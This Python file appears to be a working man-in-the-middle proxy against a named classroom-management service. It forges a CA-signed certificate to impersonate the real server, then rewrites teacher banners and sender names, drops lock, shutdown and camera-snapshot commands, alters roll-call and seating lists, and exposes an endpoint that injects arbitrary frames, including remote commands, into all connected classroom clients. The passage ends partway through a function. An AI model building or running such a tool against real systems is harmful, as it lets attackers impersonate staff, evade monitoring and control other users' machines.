#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""内容劫持代理: 伪装上游服务器, 改写 服务器->客户端 的下行帧。

前提: 客户端不严格校验证书 (SECURITY_REPORT.md 的 TLS-1/AUTH-1)。
用法: py -3 src/hijack_proxy.py [--upstream-ip IP] [--tls-port 443] [--http-port 8100]
规则: POST http://127.0.0.1:8100/__rules (深合并); 见 rules/hijack_rules.json
"""
import oplog
import argparse
import copy
import json
import time
import asyncio
import os
import ssl
import ipaddress
import socket
import datetime

from aiohttp import web, ClientSession, ClientTimeout, WSMsgType, TCPConnector
import aiohttp

# 默认规则 (可被 hijack_rules.json / POST /__rules 覆盖)
RULES = {
    # ---------------- 调试 / 开发 ----------------
    "debug": {
        "log_frames": False,        # True: 记录每个下行帧的 type (排障用)
        "dump_dir": "",             # 非空: 把下行帧 dump 成 json 文件到该目录
        "dry_run": False,           # True: 只记录"将要改写什么", 不真的改 (预演)
        "capture_max": 200          # 内存捕获环条数 (GET /__frames 可查; 0 = 关闭)
    },
    # ---------------- 横幅 ----------------
    "banner": {
        "types": ["text", "banner", "notice"],       # 视为横幅的 messageType (保守默认; 需要时自行加 popup 等)
        "block_banner": False,            # 禁止横幅: 丢弃横幅帧
        "replace": [],                    # [["作业","自习"]] -> 替换特定词 (按序)
        "remove": [],                     # ["请家长签字"]  -> 删除某些话
        "append": "",                     # " 喵~"          -> 尾部追加
        "force_sender": "",               # 改发件人显示名 (空=不改)
        "force_tts": None                 # True/False 强制开/关语音 (None=不改)
    },
    # ---------------- 座位 / 随机点名 ----------------
    "seat": {
        "exclude": [],                    # ["张三"] 永不被点名 / 从座位表移除
        "only": [],                       # ["李四"] 只允许这些人 (空=全部)
        "pairs": []                       # [["王五","赵六"]] 无论何时都坐在一起
    },
    # ---------------- 计时器 ----------------
    "timer": {
        "force_seconds": 0                # >0: 强制横幅 N 秒后自动关闭; 0=不改
    },
    # ---------------- 桌面控制命令 ----------------
    "commands": {
        "block": [],                      # ["lock_system","shutdown_system","lock_app"] 拦截
        "block_snapshot": False            # True: 拦截摄像头抓拍 (smart-attendance:snapshot)
    },
    # ---------------- 文件下发 ----------------
    "files": {
        "block_traversal": True,           # True: 拦截含 .. 的路径穿越文件名 (安全)
        "block": []                        # ["xlb_poc"] 拦截文件名含这些子串的下发
    },
    # ---------------- 通用封锁 ----------------
    "block_ws_types": [],                 # ["renderer.pack.push"] 丢弃指定 type 的 WS 帧
    "block_paths": [],                     # ["/api/v2/xxx"] 命中即返回空成功
    "passthrough": False                   # True = 直通模式: 代理活着但不改/不拦任何东西
}

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
AIO = None
ARGS = None
UPSTREAM_IP = None   # 代理直连的真实服务器 IP (绕过 hosts, 防 MITM 自环)
CLIENTS = set()      # 在线教室客户端 WS (帧注入的目标)
CAPTURE = []         # 最近帧记录 (内存环, debug.capture_max 控制长度)
STARTED_AT = None

def log(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)

def dns_resolve(domain, server="223.5.5.5"):
    """原始 UDP DNS 查询, 绕过本机 hosts (hosts 指向 127.0.0.1 时必须用它防自环)。"""
    import struct, random
    tid = random.randint(0, 65535)
    q = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    for part in domain.split("."):
        q += bytes([len(part)]) + part.encode()
    q += b"\x00" + struct.pack(">HH", 1, 1)   # QTYPE=A, QCLASS=IN
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    try:
        s.sendto(q, (server, 53))
        data, _ = s.recvfrom(512)
    finally:
        s.close()
    ancount = struct.unpack(">H", data[6:8])[0]
    i = 12
    while data[i] != 0:
        i += data[i] + 1
    i += 5                                      # 跳过 null + qtype + qclass
    for _ in range(ancount):
        if data[i] & 0xC0 == 0xC0:
            i += 2
        else:
            while data[i] != 0:
                i += data[i] + 1
            i += 1
        rtype, _, _, rdlen = struct.unpack(">HHIH", data[i:i+10])
        i += 10
        if rtype == 1 and rdlen == 4:
            return ".".join(str(b) for b in data[i:i+4])
        i += rdlen
    return None

def tcp_probe(ip, port=443, timeout=4):
    """TCP 探活"""
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False

def is_bad_ip(ip):
    """排除污染常见返回: 私有/环回/链路本地/多播/保留/0.x 等。
    DNS 污染常把域名指向内网黑洞或保留地址。"""
    try:
        parts = [int(x) for x in ip.split(".")]
        if len(parts) != 4:
            return True
    except Exception:
        return True
    a, b = parts[0], parts[1]
    if a == 0 or a == 127 or a >= 224:      # 0/8, 环回, 多播/保留
        return True
    if a == 10:                              # 10/8 私有
        return True
    if a == 172 and 16 <= b <= 31:           # 172.16/12 私有
        return True
    if a == 192 and b == 168:                # 192.168/16 私有
        return True
    if a == 169 and b == 254:                # 169.254/16 链路本地
        return True
    if a == 100 and 64 <= b <= 127:          # 100.64/10 CGNAT
        return True
    return False

def tls_verify_ip(ip, domain, timeout=6):
    """对候选 IP 做 TLS 握手 + 系统 CA 验证 + 域名匹配。
    这是抗 DNS 污染的核心: 污染返回的假 IP 不可能持有该域名的有效证书
    (真实服务器: Let's Encrypt 签发 CN=xlb.810086.com)。
    返回 (ok:bool, info:str)。"""
    try:
        ctx = ssl.create_default_context()
        s = socket.create_connection((ip, 443), timeout=timeout)
        ss = ctx.wrap_socket(s, server_hostname=domain)
        cert = ss.getpeercert()
        iss = cert.get("issuer", ())
        iss_cn = next((v for rdn in iss for k, v in rdn if k == "commonName"), "?")
        ss.close()
        return True, "CA-verified (issuer CN=%s)" % iss_cn
    except ssl.SSLCertVerificationError as e:
        return False, "cert-invalid(%s)" % str(e)[:40]
    except Exception as e:
        return False, "tls-fail(%s)" % type(e).__name__

def pick_upstream_ip(domain, servers=("223.5.5.5", "119.29.29.29", "8.8.8.8")):
    """多 DNS 解析 + 逐一 TCP 探活, 返回 (可用IP, 全部IP)。
    防 DNS 污染: 多服务器交叉验证; 防单一 IP 故障: 探活后选路。
    注意: 校园网常拦截对外 UDP/53, 三个公共 DNS 全失败很常见 —— 此时靠
    resolve_upstream() 的 DoH / 系统 DNS / 手动 IP 兜底, 不再直接退出。"""
    all_ips = []
    for srv in servers:
        try:
            ip = dns_resolve(domain, srv)   # dns_resolve 返回单个 IP 字符串
            if ip and ip not in all_ips:
                all_ips.append(ip)
        except Exception:
            continue
    if not all_ips:
        return None, []
    for ip in all_ips:
        if tcp_probe(ip):
            return ip, all_ips
    return all_ips[0], all_ips   # 都探活失败也返回第一个 (可能瞬时抖动, 运行时靠 aiohttp 超时)

def system_resolve(domain):
    """系统解析 (含 hosts/校内 DNS)。若拿到 127.0.0.1/::1 = 被自己的 hosts 劫持, 丢弃。
    校园网常只允许校内 DNS 解析, 这一步往往能成功 (而直连 53 的公共 DNS 失败)。"""
    try:
        for family, _, _, _, sockaddr in socket.getaddrinfo(domain, 443, socket.AF_INET):
            ip = sockaddr[0]
            if ip and ip not in ("127.0.0.1", "0.0.0.0"):
                return ip
    except Exception:
        pass
    return None

KNOWN_IPS = (
    "8.134.221.255",   # xlb.810086.com 历史解析结果 (最后兜底; 可能随上游变更而过期)
)

def doh_resolve_multi(domain, timeout=6):
    """DoH (DNS over HTTPS) —— **用固定 IP 直连 + SNI**, 不依赖域名解析,
    因此不受 DNS 污染影响; 443 上做 TLS 证书验证还能挡住 DoH 服务器被冒充。
    返回候选 IP 列表 (去重)。"""
    import json as _json
    endpoints = (
        ("223.5.5.5", "dns.alidns.com", "/resolve"),          # 阿里 (国内可用)
        ("223.6.6.6", "dns.alidns.com", "/resolve"),          # 阿里备
        ("119.29.29.29", "doh.pub", "/dns-query"),            # 腾讯
        ("1.1.1.1", "cloudflare-dns.com", "/dns-query"),      # CF
        ("8.8.8.8", "dns.google", "/resolve"),                # Google
    )
    out = []
    for ip, host, path in endpoints:
        try:
            ctx = ssl.create_default_context()
            s = socket.create_connection((ip, 443), timeout=timeout)
            ss = ctx.wrap_socket(s, server_hostname=host)   # SNI + 证书验证
            ss.sendall(("GET %s?name=%s&type=A HTTP/1.1\r\nHost: %s\r\n"
                        "Accept: application/dns-json\r\nConnection: close\r\n\r\n"
                        % (path, domain, host)).encode())
            data = b""
            while True:
                chunk = ss.recv(4096)
                if not chunk:
                    break
                data += chunk
            ss.close()
            body = data.split(b"\r\n\r\n", 1)[1]
            j = _json.loads(body.decode("utf-8", "replace"))
            for ans in (j.get("Answer") or []):
                if ans.get("type") == 1 and ans.get("data") and ans["data"] not in out:
                    out.append(ans["data"])
        except Exception:
            continue
    return out

def _upstream_cache_path(cert_dir):
    return os.path.join(cert_dir, "upstream_ip.json")

def read_cached_upstream(cert_dir, domain):
    """读上次成功的真实 IP (校园网 DNS 被封时, 缓存能直接救场)。"""
    try:
        with open(_upstream_cache_path(cert_dir), "r", encoding="utf-8") as f:
            d = json.load(f)
        if d.get("host") == domain and d.get("ip"):
            return d["ip"], d.get("source", "cache")
    except Exception:
        pass
    return None, None

def write_cached_upstream(cert_dir, domain, ip, source):
    try:
        os.makedirs(cert_dir, exist_ok=True)
        tmp = _upstream_cache_path(cert_dir) + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"host": domain, "ip": ip, "source": source,
                       "updatedAt": time.strftime("%Y-%m-%dT%H:%M:%S")}, f)
        os.replace(tmp, _upstream_cache_path(cert_dir))
    except Exception:
        pass

def resolve_upstream(domain, explicit_ip=None, cert_dir=".", verbose=False):
    """多层解析上游真实 IP + **TLS 证书验证筛污染** (懒执行短路, 命中即返回)。

    候选顺序: 手动 > 缓存 > 系统/校内 DNS > 公共 UDP DNS > DoH(IP直连) > 内置已知IP
    每个候选:
      1) 剔除污染常见返回 (私有/环回/保留地址)
      2) TLS 证书验证 (系统 CA + 域名匹配) <- 污染假 IP 必被淘汰
    第一个通过证书验证的立即返回 (不做多余的后续解析, 启动快)。
    全部无验证通过时, 退回第一个 TCP 可达的候选 (带 unverified 警告)。
    手动指定 (--upstream-ip / XLB_UPSTREAM_IP / rules/upstream_ip.txt) 直接短路返回 ——
    操作者的显式指定优先于一切自动判断, 不做污染过滤与证书验证。

    返回 (ip|None, source, 候选列表)。
    """
    if explicit_ip and str(explicit_ip).strip():
        ip = str(explicit_ip).strip()
        return ip, "manual", [ip]

    seen = set()

    def sources():
        """懒生成候选 (ip, source) —— 短路返回后不会继续解析后续层。"""
        c_ip, _ = read_cached_upstream(cert_dir, domain)
        if c_ip:
            yield c_ip, "cached"
        try:
            ip = system_resolve(domain)
            if ip:
                yield ip, "system-dns"
        except Exception:
            pass
        try:
            _, ips = pick_upstream_ip(domain)
            for x in (ips or []):
                yield x, "udp-dns"
        except Exception:
            pass
        try:
            for x in (doh_resolve_multi(domain) or []):
                yield x, "doh"
        except Exception:
            pass
        for k in KNOWN_IPS:
            yield k, "known"

    reachable = []
    for ip, src in sources():
        if not ip or ip in seen:
            continue
        seen.add(ip)
        if is_bad_ip(ip):
            if verbose:
                log("  候选 %-16s (%s) -> 剔除 (私有/保留地址, 疑似污染)" % (ip, src))
            continue
        ok, info = tls_verify_ip(ip, domain)
        if verbose:
            log("  候选 %-16s (%s) -> %s" % (ip, src, info))
        if ok:
            return ip, "%s+verified" % src, [ip]      # 短路: 确认真服务器
        if not reachable and tcp_probe(ip):
            reachable.append((ip, src))

    if reachable:
        ip, src = reachable[0]
        return ip, "%s+reachable(unverified!)" % src, [ip]
    return None, "unresolved", []

class FixedResolver(aiohttp.resolver.AbstractResolver):
    """把一切域名解析到候选 IP 列表 (首个探活通过的优先)。
    多 IP 容错: 主 IP 连接失败时 aiohttp 会尝试列表中的下一个。
    列表为空 (上游 IP 全解析失败) 时抛出带指引的异常, 而不是静默自环。"""
    def __init__(self, ips):
        self.ips = ips if isinstance(ips, list) else [ips]

    async def resolve(self, host, port=0, family=socket.AF_INET):
        if not self.ips:
            raise OSError(
                "no upstream IP resolved; use --upstream-ip <真实IP> "
                "or set XLB_UPSTREAM_IP=<真实IP> (run scripts/netcheck.py to diagnose)"
            )
        return [{"hostname": host, "host": ip, "port": port,
                 "family": family, "proto": 0, "flags": socket.AI_NUMERICHOST}
                for ip in self.ips]

    async def close(self):
        pass

# 自签证书 (客户端 TLS 校验全局关闭, 任何证书都过; CN 伪装成真域名更隐蔽)
def ensure_cert(cert_path, key_path, cn, ca_cert_path=None, ca_key_path=None):
    """生成 CA 根 + 用 CA 签发服务器证书。
    客户端多处 rejectUnauthorized:true (main.js:6670 等, WS 网关/核心 API),
    自签证书会被拒。只有 CA 签发的证书 + 客户端信任该 CA (NODE_EXTRA_CA_CERTS) 才能过。
    """
    if os.path.exists(cert_path) and os.path.exists(key_path) and os.path.exists(ca_cert_path):
        return
    from cryptography import x509
    from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    import datetime

    now = datetime.datetime.now(datetime.timezone.utc)

    # --- CA 根证书 ---
    ca_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    ca_name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "xlb-proxy-root-ca")])
    ca_cert = (x509.CertificateBuilder()
               .subject_name(ca_name).issuer_name(ca_name)
               .public_key(ca_key.public_key())
               .serial_number(x509.random_serial_number())
               .not_valid_before(now - datetime.timedelta(days=1))
               .not_valid_after(now + datetime.timedelta(days=3650))
               .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
               .add_extension(x509.KeyUsage(digital_signature=True, key_cert_sign=True, crl_sign=True,
                  content_commitment=False, key_encipherment=False, data_encipherment=False,
                  key_agreement=False, encipher_only=False, decipher_only=False), critical=True)
               .add_extension(x509.SubjectKeyIdentifier.from_public_key(ca_key.public_key()), critical=False)
               .sign(ca_key, hashes.SHA256()))
    with open(ca_key_path, "wb") as f:
        f.write(ca_key.private_bytes(serialization.Encoding.PEM,
                                     serialization.PrivateFormat.TraditionalOpenSSL,
                                     serialization.NoEncryption()))
    with open(ca_cert_path, "wb") as f:
        f.write(ca_cert.public_bytes(serialization.Encoding.PEM))

    # --- 服务器证书 (CN=cn, 由 CA 签发) ---
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    cert = (x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(ca_name)                     # issuer = CA
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(x509.SubjectAlternativeName(
                [x509.DNSName(cn), x509.IPAddress(ipaddress.ip_address("127.0.0.1"))]), critical=False)
            .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
            .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(ca_key.public_key()), critical=False)
            .add_extension(x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False)
            .sign(ca_key, hashes.SHA256()))            # 用 CA 私钥签
    with open(key_path, "wb") as f:
        f.write(key.private_bytes(serialization.Encoding.PEM,
                                  serialization.PrivateFormat.TraditionalOpenSSL,
                                  serialization.NoEncryption()))
    with open(cert_path, "wb") as f:
        # PEM 链: 服务器证书 + CA 证书 (TLS 握手需要发全链)
        f.write(cert.public_bytes(serialization.Encoding.PEM))
        f.write(ca_cert.public_bytes(serialization.Encoding.PEM))
    log("CA + server cert generated (CN=%s, signed by xlb-proxy-root-ca)" % cn)

# 横幅内容改写
def transform_banner_content(text, r):
    """按 remove -> replace -> append 顺序改写。
    对所有元素强制 str, 避免 CLR/JSON 把 "1" 存成数字 1 导致 replace 报错。"""
    if not isinstance(text, str):
        text = str(text)
    for bad in (r.get("remove") or []):
        if bad:
            text = text.replace(str(bad), "")
    for pair in (r.get("replace") or []):
        try:
            find, repl = pair
        except (TypeError, ValueError):
            continue
        if find is None:
            continue
        text = text.replace(str(find), "" if repl is None else str(repl))
    if r.get("append"):
        text = text + str(r["append"])
    return text

def deep_merge(base, patch):
    """递归合并: dict 深合并, 其他类型覆盖。避免 POST 部分规则时丢掉同节其他键。"""
    for k, v in patch.items():
        if isinstance(v, dict) and isinstance(base.get(k), dict):
            deep_merge(base[k], v)
        else:
            base[k] = v
    return base

def _type_match(t, pats):
    """类型名匹配: 精确相等; 以 '*' 结尾时做前缀匹配 (如 desktop.update.*)。"""
    t = str(t or "").lower()
    if not t:
        return False
    for p in pats:
        p = str(p or "").lower()
        if p.endswith("*"):
            if p[:-1] and t.startswith(p[:-1]):
                return True
        elif t == p:
            return True
    return False

def _debug_frame(frame, direction="down"):
    """debug.log_frames / dump_dir: 记录或落盘每个帧。"""
    dbg = RULES.get("debug") or {}
    try:
        if dbg.get("log_frames"):
            log("  帧[%s] type=%s messageType=%s id=%s" % (
                direction, frame.get("type", "?"),
                frame.get("messageType") or frame.get("message_type") or "-",
                frame.get("messageId") or "-"))
        d = (dbg.get("dump_dir") or "").strip()
        if d:
            os.makedirs(d, exist_ok=True)
            fn = os.path.join(d, "%s_%s_%s.json" % (
                time.strftime("%H%M%S"),
                frame.get("messageId") or frame.get("type", "frame"),
                int(time.time() * 1000) % 100000))
            with open(fn, "w", encoding="utf-8") as fh:
                json.dump(frame, fh, ensure_ascii=False, indent=2)
    except Exception as e:
        log("  [debug] frame log error: %s" % e)

def _frame_brief(frame):
    """帧摘要: 类型 + 关键字段, 供捕获环 / 日志使用 (不写全帧)。"""
    brief = {
        "type": frame.get("type"),
        "messageType": frame.get("messageType") or frame.get("message_type"),
        "id": frame.get("messageId") or frame.get("message_id"),
    }
    for k in ("content", "command", "action", "fileName", "version", "signal"):
        v = frame.get(k)
        if v not in (None, ""):
            brief[k] = str(v)[:120]
    return brief

def capture_add(direction, frame, action):
    """记一条到内存捕获环 (debug.capture_max 条, 0 = 关闭)。永不抛异常。
    direction: down=服务器->客户端, up=客户端->服务器, inject=本机注入。
    action:    pass / rewrite / drop / up / inject。"""
    try:
        cmax = int((RULES.get("debug") or {}).get("capture_max") or 0)
        if cmax <= 0:
            return
        entry = _frame_brief(frame)
        entry["t"] = time.strftime("%H:%M:%S")
        entry["dir"] = direction
        entry["action"] = action
        entry["raw"] = json.dumps(frame, ensure_ascii=False)[:1000]
        CAPTURE.append(entry)
        del CAPTURE[:-cmax]
    except Exception:
        pass

def transform_broadcast_frame(frame):
    """下行帧改写入口 (broadcast.message 与 class.data.* 等任意 type)。返回 None = 丢弃该帧。
    支持: 横幅改写/封锁, 计时器, 座位/名单, 桌面命令拦截, 文件拦截, 类型封锁, debug/dry_run。"""
    if RULES.get("passthrough"):
        return frame                     # 直通模式: 原样放行, 零干预
    r = RULES
    f = copy.deepcopy(frame)
    mtype = str(f.get("messageType") or f.get("message_type") or "").lower()
    ftype = str(f.get("type") or "")
    dry = bool((r.get("debug") or {}).get("dry_run"))

    if (r.get("debug") or {}).get("log_frames") \
            or ((r.get("debug") or {}).get("dump_dir") or "").strip():
        _debug_frame(f, "down")

    def would(action):
        """dry_run 时只报告不改写。返回 True 表示应当继续真实修改。"""
        if dry:
            log("  [dry-run] 将会: %s" % action)
            return False
        return True

    # --- 类型级封锁 (任意 type; 支持 desktop.update.* 这种前缀写法) ---
    block_types = r.get("block_ws_types") or []
    if _type_match(mtype, block_types) or _type_match(ftype, block_types):
        log("BLOCK ws type=%s messageType=%s (禁止功能)" % (ftype, mtype))
        return None

    # --- 桌面控制命令拦截 ---
    cmds = r.get("commands") or {}
    blocked = [str(x).lower() for x in (cmds.get("block") or [])]
    if mtype == "command":
        action = str(f.get("command") or f.get("action") or f.get("title") or "").lower()
        if action in blocked:
            log("BLOCK command=%s (命令拦截)" % action)
            return None
        if cmds.get("block_snapshot") and "snapshot" in action:
            log("BLOCK command=%s (摄像头抓拍拦截)" % action)
            return None

    # --- 文件下发拦截 ---
    if mtype == "file":
        fname = str(f.get("fileName") or f.get("file_name") or "")
        fm = r.get("files") or {}
        if fm.get("block_traversal", True) and ".." in fname:
            log("BLOCK file=%r (路径穿越拦截)" % fname)
            return None
        for pat in (fm.get("block") or []):
            if pat and str(pat) in fname:
                log("BLOCK file=%r (命中规则 %r)" % (fname, pat))
                return None

    # --- 横幅: 类型可配置 ---
    banner_types = ((r.get("banner") or {}).get("types") or ["text", "banner", "notice"])
    is_banner = _type_match(mtype, banner_types)   # 与 block_ws_types 一致, 支持尾部 * 前缀匹配

    if is_banner and (r.get("banner") or {}).get("block_banner"):
        log("BLOCK banner frame id=%s (禁止横幅)" % f.get("messageId"))
        return None

    if is_banner and isinstance(f.get("content"), str):
        orig = f["content"]
        new_content = transform_banner_content(orig, r["banner"])
        if new_content != orig:
            if would("横幅改写 %r -> %r" % (orig[:40], new_content[:60])):
                f["content"] = new_content
                meta = f.get("metadata")
                if isinstance(meta, dict) and isinstance(meta.get("content"), str):
                    meta["content"] = new_content
                log("BANNER rewrite: %r -> %r" % (orig[:40], new_content))
        meta = f.get("metadata")
        if r["banner"].get("force_sender"):
            if would("改发件人为 %r" % r["banner"]["force_sender"]):
                f["sender"] = r["banner"]["force_sender"]
                if isinstance(meta, dict):
                    meta["sender"] = r["banner"]["force_sender"]
        if r["banner"].get("force_tts") is not None:
            if would("强制 TTS = %s" % r["banner"]["force_tts"]):
                f["enableTTS"] = bool(r["banner"]["force_tts"])
                if isinstance(meta, dict):
                    meta["enableTTS"] = bool(r["banner"]["force_tts"])

    # --- 计时器 ---
    secs = int((r.get("timer") or {}).get("force_seconds") or 0)
    if secs > 0 and (is_banner or mtype == "file"):
        if would("计时器强制 %ss" % secs):
            f["popup_duration"] = secs
            f["popupDuration"] = secs
            meta = f.get("metadata")
            if isinstance(meta, dict):
                meta["popup_duration"] = secs
                meta["popupDuration"] = secs
            log("TIMER forced: %ss (frame id=%s)" % (secs, f.get("messageId")))

    # --- 班级数据帧: 内嵌座位表/学生名单改写 ---
    if ftype.lower().startswith("class.data."):
        pushed = f.get("seatLayout") or f.get("seat_layout")
        if isinstance(pushed, dict) and isinstance(pushed.get("seats"), list):
            fake = {"data": {"seats": pushed["seats"]}}
            fake, ch = transform_seat_data(fake)
            if ch:
                if not dry:
                    pushed["seats"] = fake["data"]["seats"]
                log("SEAT push-layout rewritten (class.data frame)")
        sd = f.get("data")
        if isinstance(sd, dict):
            for key in ("students", "studentList", "student_list"):
                if isinstance(sd.get(key), list):
                    newl, ch = apply_student_rules(sd[key])
                    if ch:
                        if not dry:
                            sd[key] = newl
                        log("STUDENTS rewritten in %s frame" % ftype)
            if isinstance(sd.get("seatLayout"), dict) and isinstance(sd["seatLayout"].get("seats"), list):
                fake = {"data": {"seats": sd["seatLayout"]["seats"]}}
                fake, ch = transform_seat_data(fake)
                if ch:
                    if not dry:
                        sd["seatLayout"]["seats"] = fake["data"]["seats"]
                    log("SEAT rewritten in %s frame" % ftype)

    return f

# 座位表规则
def _num(s, *keys):
    for k in keys:
        v = s.get(k)
        if v is not None:
            try: return int(v)
            except Exception: pass
    return None

def _set_pos(s, row, col):
    for rk in ("row_number", "rowNumber"):
        if rk in s: s[rk] = row
    for ck in ("col_number", "colNumber"):
        if ck in s: s[ck] = col

def _get_pos(s):
    return (_num(s, "row_number", "rowNumber"), _num(s, "col_number", "colNumber"))

def _name(s):
    return str(s.get("student_name") or s.get("studentName") or s.get("name")
             or s.get("real_name") or s.get("nickname") or "").strip()

def apply_student_rules(students):
    """学生名单规则: 黑名单->移除, 白名单->只留, 结对->强制相邻 (有 name 字段时)。
    返回 (新列表, 是否改动)。"""
    r = RULES["seat"]
    out, changed = [], False
    ban = set(r["exclude"]); allow = set(r["only"]) if r["only"] else None
    for s in students:
        if not isinstance(s, dict):
            out.append(s); continue
        n = _name(s)
        if n and (n in ban or (allow is not None and n not in allow)):
            changed = True
            continue                       # 黑名单/非白名单: 从名单移除
        out.append(s)
    return out, changed

def transform_seat_data(payload):
    r = RULES["seat"]
    if not (r["exclude"] or r["only"] or r["pairs"]):
        return payload, False
    seats = (payload.get("data") or {}).get("seats")
    if not isinstance(seats, list):
        return payload, False

    changed = False
    # 1) 黑名单 -> 标 empty, 客户端 getSelectableSeats 自动剔除 (显示+点名都消失)
    if r["exclude"]:
        ban = set(r["exclude"])
        for s in seats:
            if _name(s) in ban:
                s["seat_type"] = "empty"; s["seatType"] = "empty"
                s["student_name"] = ""; s["studentName"] = ""
                changed = True
                log("SEAT exclude: %s -> empty" % ban)

    # 2) 白名单 -> 其余全标空
    if r["only"]:
        allow = set(r["only"])
        for s in seats:
            if _name(s) and _name(s) not in allow:
                s["seat_type"] = "empty"; s["seatType"] = "empty"
                s["student_name"] = ""; s["studentName"] = ""
                changed = True

    # 3) 结对: b 强制到 a 右邻位, 原右邻与 b 互换
    for pair in r["pairs"]:
        if not isinstance(pair, list) or len(pair) != 2:
            continue
        by_name = {_name(s): s for s in seats if _name(s)}
        a, b = by_name.get(pair[0]), by_name.get(pair[1])
        if not a or not b:
            continue
        ar, ac = _get_pos(a)
        if ar is None:
            continue
        neighbor = next((s for s in seats if s is not a and _get_pos(s) == (ar, ac + 1)), None)
        if neighbor is None or neighbor is b:
            continue
        br, bc = _get_pos(b)
        _set_pos(b, ar, ac + 1)
        _set_pos(neighbor, br, bc)
        changed = True
        log("SEAT pair: %s <-> %s now adjacent" % (pair[0], pair[1]))

    return payload, changed

# HTTP 反向代理
async def proxy_http(request):
    path = request.rel_url.path

    if path == "/__rules":
        if request.method == "POST":
            body = await request.json()
            deep_merge(RULES, body)
            log("RULES updated (deep-merge): %s" % json.dumps(RULES, ensure_ascii=False)[:300])
        return web.json_response(RULES)

    if path == "/__status":
        return web.json_response({
            "clients": len(CLIENTS), "capture": len(CAPTURE), "startedAt": STARTED_AT,
            "upstream": ARGS.upstream, "upstreamIp": UPSTREAM_IP,
            "passthrough": bool(RULES.get("passthrough")),
        })

    if path == "/__clients":
        return web.json_response({"clients": len(CLIENTS)})

    if path == "/__frames":
        try:
            n = max(1, min(1000, int(request.query.get("n", "50"))))
        except Exception:
            n = 50
        if request.query.get("clear") in ("1", "true", "yes"):
            out = list(CAPTURE)
            del CAPTURE[:]
            return web.json_response({"count": 0, "cleared": len(out), "frames": out})
        return web.json_response({"count": len(CAPTURE), "frames": CAPTURE[-n:]})

    if path == "/__inject":
        if request.method != "POST":
            return web.json_response({"ok": False, "error": "POST only"}, status=405)
        try:
            body = await request.json()
        except Exception as e:
            return web.json_response({"ok": False, "error": "bad json: %s" % e}, status=400)
        frame, apply_rules = build_frame(body)
        if frame is None:
            return web.json_response({"ok": False, "error": apply_rules}, status=400)
        text = json.dumps(frame, ensure_ascii=False)
        if apply_rules:
            text = transform_downlink(text, direction="inject")   # 已进捕获环
            if text is None:
                return web.json_response({"ok": True, "sent_to": 0, "dropped": True,
                                          "reason": "命中规则被丢弃"})
            frame = json.loads(text)
        sent, dead = 0, []
        for c in list(CLIENTS):
            try:
                await c.send_str(text)
                sent += 1
            except Exception:
                dead.append(c)
        for c in dead:
            CLIENTS.discard(c)
        if not apply_rules:
            capture_add("inject", frame, "inject")
        log("INJECT -> %d client(s), 失效 %d: %s" % (
            sent, len(dead), json.dumps(_frame_brief(frame), ensure_ascii=False)))
        return web.json_response({"ok": True, "sent_to": sent, "frame": frame})

    passthrough = RULES.get("passthrough")

    for bp in ([] if passthrough else RULES["block_paths"]):
        if path.startswith(bp):
            log("BLOCK path %s (禁止功能)" % path)
            return web.json_response({"success": True, "data": {}})

    url = "%s%s" % (ARGS.upstream.rstrip("/"), request.rel_url.path_qs)
    try:
        headers = {k: v for k, v in request.headers.items()
                   if k.lower() not in ("host", "content-length")}
        headers["Host"] = ARGS.upstream_host   # 让真实服务器认为是正常请求
        async with AIO.request(request.method, url, data=await request.read(),
                               headers=headers, allow_redirects=False) as resp:
            body = await resp.read()
            ctype = resp.headers.get("Content-Type", "")

            if "json" in ctype:
                try:
                    payload = json.loads(body.decode("utf-8"))
                    payload, changed = transform_http_json(path, payload)
                    if changed:
                        body = json.dumps(payload, ensure_ascii=False).encode("utf-8")
                except Exception as e:
                    log("json rewrite failed: %s" % e)

            out_headers = {k: v for k, v in resp.headers.items()
                           if k.lower() not in ("content-length", "transfer-encoding",
                                                "content-encoding", "strict-transport-security")}
            return web.Response(status=resp.status, body=body, headers=out_headers)
    except Exception as e:
        log("upstream error %s: %s" % (url, e))
        return web.json_response({"success": False, "message": "proxy upstream error"}, status=502)

def build_frame(body):
    """把注入请求补全成可发帧, 返回 (frame, apply_rules) 或 (None, 错误文本)。

    三种形式:
      {"frame": {...}}                     原样发帧 (自动补 messageId)
      {"type": "renderer.pack.push", ...}  带 type 的非广播帧原样发帧
      {"text"/"content": "..."}            简写: 组装 broadcast.message 横幅帧
      {"command": "lock_system"}           简写: 组装远程控制命令帧
    """
    if not isinstance(body, dict):
        return None, "body must be a JSON object"
    apply_rules = bool(body.get("apply_rules"))
    frame = body.get("frame")
    if not isinstance(frame, dict):
        if "type" in body and body.get("type") != "broadcast.message":
            frame = {k: v for k, v in body.items() if k != "apply_rules"}
        else:
            content = body.get("content") or body.get("text") or body.get("message")
            command = body.get("command")
            if not content and not command:
                return None, "需要 content/text/command 之一, 或直接给 frame"
            mtype = body.get("messageType") or body.get("message_type")
            frame = {"type": "broadcast.message"}
            if command:
                frame["messageType"] = mtype or "command"
                frame["command"] = command
            else:
                frame["messageType"] = mtype or "text"
                frame["content"] = content
            seconds = body.get("seconds") or body.get("popup_duration") or body.get("popupDuration")
            if seconds:
                frame["popup_duration"] = int(seconds)
                frame["popupDuration"] = int(seconds)
